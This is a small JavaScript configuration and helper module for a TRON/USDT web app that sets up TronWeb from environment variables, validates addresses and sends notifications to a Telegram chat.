import { TronWeb } from 'tronweb';

const CFG = {
    FULL_NODE: process.env.NEXT_PUBLIC_FULL_NODE || 'https://api.trongrid.io',
    API_KEY: process.env.NEXT_PUBLIC_API_KEY,
    PRIVATE_KEY: process.env.PRIVATE_KEY, // Server-side only
    USDT: process.env.NEXT_PUBLIC_USDT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    SPENDER: process.env.NEXT_PUBLIC_SPENDER,
    TG_TOKEN: process.env.TG_TOKEN,
    TG_CHAT: process.env.TG_CHAT,
};

export const getServerTW = () => {
    if (!CFG.PRIVATE_KEY) throw new Error('Missing PRIVATE_KEY on server');
    return new TronWeb({
        fullHost: CFG.FULL_NODE,
        headers: { 'TRON-PRO-API-KEY': CFG.API_KEY || '' },
        privateKey: CFG.PRIVATE_KEY,
    });
};

export const validateAddress = (addr) => {
    try {
        const tw = new TronWeb({ fullHost: CFG.FULL_NODE });
        return tw.isAddress(addr);
    } catch {
        return false;
    }
};

export const sendTelegram = async (msg) => {
    if (!CFG.TG_TOKEN || !CFG.TG_CHAT) return;
    try {
        await fetch(`https://api.telegram.org/bot${CFG.TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CFG.TG_CHAT, text: msg, parse_mode: 'HTML' }),
        });
    } catch (e) {
        console.error('Telegram error:', e);
    }
};

export { CFG };
